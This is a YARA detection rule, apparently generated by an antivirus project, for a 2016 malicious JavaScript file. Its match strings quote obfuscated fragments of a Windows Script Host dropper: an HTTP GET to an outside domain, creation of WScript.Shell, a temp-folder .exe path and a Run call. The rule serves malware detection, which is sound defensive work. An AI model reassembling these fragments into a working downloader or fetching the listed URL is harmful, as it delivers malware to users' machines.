rule sig_20160330_e9f3f88465ca799c5a304854d6fa05f7 {
  meta:
    description = "datamaliciousorder - file 20160330_e9f3f88465ca799c5a304854d6fa05f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5edf94414ab19e44d6012de242a621e64a91f2ccfe7e9fc7a33e0fbf4b654d88"

  strings:
    $s1  = "_S0[_F1](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "function _KS(_O, _BR){_CD = _CD * 1; return _O - _BR;};" fullword ascii
    $s3  = "var _NY = function _GO() {return WScript[_P0](\"WScript\"+\".Shell\");}(), _E = 11;" fullword ascii
    $s4  = "if (_S0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _FW() {return _NY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yQx4305s.ex\" + \"e\";};" fullword ascii
    $s6  = "function _PQ(){return _L + \"\";};" fullword ascii
    $s7  = "function _J() {return ((_A0 == true) && (_A0 == _V)) ? 1 : _CD;};" fullword ascii
    $s8  = "function _C(_XQ){_NY[\"Run\"](_XQ, _CD, _CD);};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _F()" fullword ascii
    $s11 = "var _DB = new this[\"Date\"]();" fullword ascii
    $s12 = "function _GV(){return 22;};" fullword ascii
    $s13 = "function _F0(){return _P0;};" fullword ascii
    $s14 = "return _KS(_FK, _XD);" fullword ascii
    $s15 = "function _FT(_S) {var _Q = (1, 2, 3, 4, 5, _S); return _Q;};" fullword ascii
    $s16 = "_A0 = true; " fullword ascii
    $s17 = "var _A0 = false;" fullword ascii
    $s18 = "var _AM = false;" fullword ascii
    $s19 = "var _V = false;" fullword ascii
    $s20 = "_V = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}